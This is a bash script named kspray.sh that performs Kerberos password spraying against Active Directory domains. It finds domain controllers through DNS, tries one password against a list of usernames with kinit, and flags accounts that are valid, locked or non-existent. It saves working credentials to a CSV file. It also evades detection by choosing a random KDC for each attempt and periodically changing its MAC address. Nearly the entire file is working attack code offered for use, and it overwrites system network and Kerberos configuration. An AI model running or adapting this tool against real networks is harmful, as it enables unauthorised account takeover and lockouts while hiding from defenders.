#!/bin/bash
#####################################################################################
# Script: kspray.sh  |  By: John Harper
#####################################################################################
# kspray is useful on an untrusted/non-domain joined Kali host to perform:
# - Password spraying using kerberos
# - DC/KDC enumeration (KDCs are ranomly selected for each authentication attempt)
# - User enumeration (Positivly identifies users if you didn't already know them)
#####################################################################################

### Feature Requests ###
# - Create a distributed spray (support for additional spray nodes with task manager)
# - What other opportunities are there as an authenticated user? (aka valid /tmp/krb5cc_0 file)
# - Format export for bloodhound
# - Intake users from: https://github.com/dirkjanm/ldapdomaindump

### Known Issues ###
# - Passing $NIC doesn't update the /etc/network/interfaces with any other than eth0

### User Defined Variables ###
PATHKINIT=/usr/bin/kinit

### Global Variables ###
readonly CALLDIR=$(pwd)
readonly DATETIME=$(date +%Y%m%d_%H%M%S)
readonly REPORTKDC=kspray-KDCs_$DATETIME.txt
readonly REPORTCREDS=kspray-Creds_$DATETIME.csv

### Style ###
readonly YELLOW="\\e[33m"
readonly BRITEGREEN="\\e[92m"
readonly DARKGREEN="\\e[32m"
readonly RED="\\e[31m"

function show_time () {
	num=$1
	min=0
	hour=0
	day=0
	if((num>59));then
		((sec=num%60))
		((num=num/60))
		if((num>59));then
			((min=num%60))
			((num=num/60))
			if((num>23));then
				((hour=num%24))
				((day=num/24))
			else
				((hour=num))
			fi
		else
			((min=num))
		fi
	else
		((sec=num))
	fi
	echo "$day"d "$hour"h "$min"m "$sec"s
}

# Check if root - needed to make changes to /etc/network/interfaces
if [[ $EUID -ne 0 ]]; then
	echo -e "$RED Please run as root"
	printf "\n"
	exit 1
fi

### Title ###
clear
echo -e "$DARKGREEN "
echo ICBfX19fX18gX18gICAgICAgICAgICAgICBfX19fX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIF9fXyAgLy9fLyAgICAgICAgICAgICAgIF9fICBfX18vX19fX19fX19fX19fX19fX19fX18gX19fX18gIF9fCiAgX18gICw8ICAgICBfX19fX19fXyAgICAgX19fX18gXF9fXyAgX18gXF8gIF9fXy8gIF9fIGAvXyAgLyAvIC8KICBfICAvfCB8ICAgIF8vX19fX18vICAgICBfX19fLyAvX18gIC9fLyAvICAvICAgLyAvXy8gL18gIC9fLyAvIAogIC9fLyB8X3wgICAgICAgICAgICAgICAgIC9fX19fLyBfICAuX19fLy9fLyAgICBcX18sXy8gX1xfXywgLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgICAgICAgICAgICAgICAgICAvX19fXy8gICAK |base64 -d
echo -e "$YELLOW=================================================================="
echo -e "$YELLOW kspray.sh | [Version]: 1.0.0 | [Updated]: 12.13.2018"
echo -e "$YELLOW=================================================================="
echo -e "$YELLOW [By]: John Harper | [GitHub]: https://github.com/rollinz007"
echo -e "$YELLOW=================================================================="
echo

DOMAININ=$1
USERLIST=$2
PASSWORD=$3
NIC=$4
ATTEMPTS=$5

# Startup/Usage Statement
if [[ $# -ne 5 ]]; then
    printf "\n"
    echo -e "$BRITEGREEN   [Usage]: ./kspray.sh [DOMAIN] [usernames.txt] [password] [NIC] [# of attempts before mac change]"
    echo -e "$BRITEGREEN [Example]: ./kspray.sh CORP.NET users.txt Spring2018 eth0 3"
    printf "\n"
	exit 1
fi

# Overwrite existing network configuration to ensure ifdown/ifup works properly with DHCP in Kali
if [ ! -e "/etc/network/interfaces_kspraybkp" ]; then
	cp /etc/network/interfaces /etc/network/interfaces_kspraybkp
fi
echo IyBUaGlzIGZpbGUgZGVzY3JpYmVzIHRoZSBuZXR3b3JrIGludGVyZmFjZXMgYXZhaWxhYmxlIG9uIHlvdXIgc3lzdGVtCiMgYW5kIGhvdyB0byBhY3RpdmF0ZSB0aGVtLiBGb3IgbW9yZSBpbmZvcm1hdGlvbiwgc2VlIGludGVyZmFjZXMoNSkuCgpzb3VyY2UgL2V0Yy9uZXR3b3JrL2ludGVyZmFjZXMuZC8qCgojIFRoZSBsb29wYmFjayBuZXR3b3JrIGludGVyZmFjZQphdXRvIGxvCmlmYWNlIGxvIGluZXQgbG9vcGJhY2sKCiMgUmVmZXJlbmNlOiB3d3cuc29sdXRpb25zYXRleHBlcnRzLmNvbS9pcC1hZGRyZXNzLWNvbmZpZ3VyYXRpb24taW4ta2FsaS1saW51eAphdXRvIGV0aDAKYWxsb3ctaG90cGx1ZyBldGgwCmlmYWNlIGV0aDAgaW5ldCBkaGNwCg== |base64 -d > /etc/network/interfaces

# Check for kerberos utilies, if exists, backup old krb5.conf and replace with sed version
if [ ! -e "$PATHKINIT" ]; then
	echo -e "$RED Missing kinit!"
	echo "INSTALL: apt-get install krb5-user"
	echo "Expected Location: $PATHKINIT"
	printf "\n"
	exit 1
fi
mv /etc/krb5.conf /etc/kspraykrb5.conf
echo W2xpYmRlZmF1bHRzXQoJZGVmYXVsdF9yZWFsbSA9IEtTUFJBWURPTUFJTgoKIyBUaGUgZm9sbG93aW5nIGtyYjUuY29uZiB2YXJpYWJsZXMgYXJlIG9ubHkgZm9yIE1JVCBLZXJiZXJvcy4KCWtkY190aW1lc3luYyA9IDEKCWNjYWNoZV90eXBlID0gNAoJZm9yd2FyZGFibGUgPSB0cnVlCglwcm94aWFibGUgPSB0cnVlCgojIFRoZSBmb2xsb3dpbmcgZW5jcnlwdGlvbiB0eXBlIHNwZWNpZmljYXRpb24gd2lsbCBiZSB1c2VkIGJ5IE1JVCBLZXJiZXJvcwojIGlmIHVuY29tbWVudGVkLiAgSW4gZ2VuZXJhbCwgdGhlIGRlZmF1bHRzIGluIHRoZSBNSVQgS2VyYmVyb3MgY29kZSBhcmUKIyBjb3JyZWN0IGFuZCBvdmVycmlkaW5nIHRoZXNlIHNwZWNpZmljYXRpb25zIG9ubHkgc2VydmVzIHRvIGRpc2FibGUgbmV3CiMgZW5jcnlwdGlvbiB0eXBlcyBhcyB0aGV5IGFyZSBhZGRlZCwgY3JlYXRpbmcgaW50ZXJvcGVyYWJpbGl0eSBwcm9ibGVtcy4KIwojIFRoZSBvbmx5IHRpbWUgd2hlbiB5b3UgbWlnaHQgbmVlZCB0byB1bmNvbW1lbnQgdGhlc2UgbGluZXMgYW5kIGNoYW5nZQojIHRoZSBlbmN0eXBlcyBpcyBpZiB5b3UgaGF2ZSBsb2NhbCBzb2Z0d2FyZSB0aGF0IHdpbGwgYnJlYWsgb24gdGlja2V0CiMgY2FjaGVzIGNvbnRhaW5pbmcgdGlja2V0IGVuY3J5cHRpb24gdHlwZXMgaXQgZG9lc24ndCBrbm93IGFib3V0IChzdWNoIGFzCiMgb2xkIHZlcnNpb25zIG9mIFN1biBKYXZhKS4KCiMJZGVmYXVsdF90Z3NfZW5jdHlwZXMgPSBkZXMzLWhtYWMtc2hhMQojCWRlZmF1bHRfdGt0X2VuY3R5cGVzID0gZGVzMy1obWFjLXNoYTEKIwlwZXJtaXR0ZWRfZW5jdHlwZXMgPSBkZXMzLWhtYWMtc2hhMQoKIyBUaGUgZm9sbG93aW5nIGxpYmRlZmF1bHRzIHBhcmFtZXRlcnMgYXJlIG9ubHkgZm9yIEhlaW1kYWwgS2VyYmVyb3MuCglmY2MtbWl0LXRpY2tldGZsYWdzID0gdHJ1ZQoKW3JlYWxtc10KCUtTUFJBWURPTUFJTiA9IHsKCQlrZGMgPSBLU1BSQVlLREMKCQlhZG1pbl9zZXJ2ZXIgPSBLU1BSQVlLREMKCX0KCUFUSEVOQS5NSVQuRURVID0gewoJCWtkYyA9IGtlcmJlcm9zLm1pdC5lZHUKCQlrZGMgPSBrZXJiZXJvcy0xLm1pdC5lZHUKCQlrZGMgPSBrZXJiZXJvcy0yLm1pdC5lZHU6ODgKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5taXQuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBtaXQuZWR1Cgl9CglaT05FLk1JVC5FRFUgPSB7CgkJa2RjID0gY2FzaW8ubWl0LmVkdQoJCWtkYyA9IHNlaWtvLm1pdC5lZHUKCQlhZG1pbl9zZXJ2ZXIgPSBjYXNpby5taXQuZWR1Cgl9CglDU0FJTC5NSVQuRURVID0gewoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLmNzYWlsLm1pdC5lZHUKCQlkZWZhdWx0X2RvbWFpbiA9IGNzYWlsLm1pdC5lZHUKCX0KCUlIVEZQLk9SRyA9IHsKCQlrZGMgPSBrZXJiZXJvcy5paHRmcC5vcmcKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5paHRmcC5vcmcKCX0KCTFUUy5PUkcgPSB7CgkJa2RjID0ga2VyYmVyb3MuMXRzLm9yZwoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLjF0cy5vcmcKCX0KCUFORFJFVy5DTVUuRURVID0gewoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLmFuZHJldy5jbXUuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBhbmRyZXcuY211LmVkdQoJfQogICAgICAgIENTLkNNVS5FRFUgPSB7CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0xLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0yLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0zLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5jcy5jbXUuZWR1CiAgICAgICAgfQoJREVNRU5USUEuT1JHID0gewoJCWtkYyA9IGtlcmJlcm9zLmRlbWVudGl4Lm9yZwoJCWtkYyA9IGtlcmJlcm9zMi5kZW1lbnRpeC5vcmcKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5kZW1lbnRpeC5vcmcKCX0KCXN0YW5mb3JkLmVkdSA9IHsKCQlrZGMgPSBrcmI1YXV0aDEuc3RhbmZvcmQuZWR1CgkJa2RjID0ga3JiNWF1dGgyLnN0YW5mb3JkLmVkdQoJCWtkYyA9IGtyYjVhdXRoMy5zdGFuZm9yZC5lZHUKCQltYXN0ZXJfa2RjID0ga3JiNWF1dGgxLnN0YW5mb3JkLmVkdQoJCWFkbWluX3NlcnZlciA9IGtyYjUtYWRtaW4uc3RhbmZvcmQuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBzdGFuZm9yZC5lZHUKCX0KICAgICAgICBVVE9ST05UTy5DQSA9IHsKICAgICAgICAgICAgICAgIGtkYyA9IGtlcmJlcm9zMS51dG9yb250by5jYQogICAgICAgICAgICAgICAga2RjID0ga2VyYmVyb3MyLnV0b3JvbnRvLmNhCiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvczMudXRvcm9udG8uY2EKICAgICAgICAgICAgICAgIGFkbWluX3NlcnZlciA9IGtlcmJlcm9zMS51dG9yb250by5jYQogICAgICAgICAgICAgICAgZGVmYXVsdF9kb21haW4gPSB1dG9yb250by5jYQoJfQoKW2RvbWFpbl9yZWFsbV0KCS5taXQuZWR1ID0gQVRIRU5BLk1JVC5FRFUKCW1pdC5lZHUgPSBBVEhFTkEuTUlULkVEVQoJLm1lZGlhLm1pdC5lZHUgPSBNRURJQS1MQUIuTUlULkVEVQoJbWVkaWEubWl0LmVkdSA9IE1FRElBLUxBQi5NSVQuRURVCgkuY3NhaWwubWl0LmVkdSA9IENTQUlMLk1JVC5FRFUKCWNzYWlsLm1pdC5lZHUgPSBDU0FJTC5NSVQuRURVCgkud2hvaS5lZHUgPSBBVEhFTkEuTUlULkVEVQoJd2hvaS5lZHUgPSBBVEhFTkEuTUlULkVEVQoJLnN0YW5mb3JkLmVkdSA9IHN0YW5mb3JkLmVkdQoJLnNsYWMuc3RhbmZvcmQuZWR1ID0gU0xBQy5TVEFORk9SRC5FRFUKICAgICAgICAudG9yb250by5lZHUgPSBVVE9ST05UTy5DQQogICAgICAgIC51dG9yb250by5jYSA9IFVUT1JPTlRPLkNBCgo= |base64 -d > /etc/krb5.conf

# Convert user supplied domain to UPPER if needed
DOMAIN=$(echo $DOMAININ |awk '{print toupper($0)}')

# Replace domain in krb5.conf
sed -i 's/KSPRAYDOMAIN/'"$DOMAIN"'/g' /etc/krb5.conf

# Enumerate KDCs
nslookup -type=srv _kerberos._tcp.$DOMAIN |grep = |cut -d' ' -f6 |cut -d'.' -f1-3 > $REPORTKDC
if [ ! -s "$REPORTKDC" ]; then
	echo -e "$RED Unable to get KDC list!"
	echo -e "$RED CHECK: /etc/krb5.conf"
	printf "\n"
	exit 1
fi

# Remove any blank lines from provided username list
sed -i '/^[[:space:]]*$/d' $USERLIST

TOTALKDCS=$(wc -l $REPORTKDC |cut -d' ' -f1) # Get total KDC count
PREVIOUSKDC=KSPRAYKDC # Track previous KDC for future find and replace with awk
MACADDRUSEDCOUNT=0 # Start counting how many times MAC address is used
USERCOUNT=0 # Start counting users sprayed, hopefully the end number matches total users in file
TIMERSTART=$SECONDS

while read USERNAME; do
	RANDOMKDC=$(echo $((1 + RANDOM % $TOTALKDCS)))
	KDC=$(awk "NR==$RANDOMKDC" $REPORTKDC)
	sed -i 's/'"$PREVIOUSKDC"'/'"$KDC"'/g' /etc/krb5.conf
	COMMAND=$(echo $PASSWORD | kinit $USERNAME@$DOMAIN 2>&1)

	### Bad KDC ###
	if [[ $COMMAND == *"Cannot contact any KDC"* ]]; then
		echo -e "$RED COULD NOT LOCATE $KDC IN THE $DOMAIN REALM!"
		exit 1

	### Locked Account ###
	elif [[ $COMMAND == *"Clients credentials have been revoked"* ]]; then
		echo -e "$RED ACCOUNT IS LOCKED OUT!: $USERNAME"

	### Account does not exist ###
	elif [[ $COMMAND == *"Client"* ]] && [[ $COMMAND == *"not found"* ]]; then
		echo -e "$RED NON-EXISTENT USER: $USERNAME"

	### Woot! Got a hit ###
	elif [[ -e "/tmp/krb5cc_0" ]]; then
		echo -e "$BRITEGREEN SUCCESS: $USERNAME@$DOMAIN : $PASSWORD"
		touch $REPORTCREDS; echo "$USERNAME;$DOMAIN;$PASSWORD" >> $REPORTCREDS
		rm /tmp/krb5cc_0

	### Password is bad ###
	else
		echo -e "$YELLOW BAD PASSWORD: $USERNAME"
	fi

	PREVIOUSKDC=$KDC
	let "USERCOUNT+=1"
	let "MACADDRUSEDCOUNT+=1"

	if [[ $MACADDRUSEDCOUNT == $ATTEMPTS ]]; then
		echo -e "$BRITEGREEN Changing MAC Address..."
		IFDOWN=$(ifdown $NIC 2>&1)
		MACCHANGER=$(macchanger -r $NIC 2>&1)
		IFUP=$(ifup $NIC 2>&1)
		MACADDRUSEDCOUNT=0
	fi
done < $USERLIST

TIME=$(show_time "$(($SECONDS - $TIMERSTART))")

printf "\n"
echo -e "$DARKGREEN $USERCOUNT accounts sprayed with \"$PASSWORD\" "
echo -e "$DARKGREEN $TOTALKDCS randomly selected KDCs were utilized"
echo -e "$DARKGREEN Spray completed in: $TIME"
printf "\n"

# Put things back the way they were before script ran
mv /etc/kspraykrb5.conf /etc/krb5.conf
mv /etc/network/interfaces_kspraybkp /etc/network/interfaces
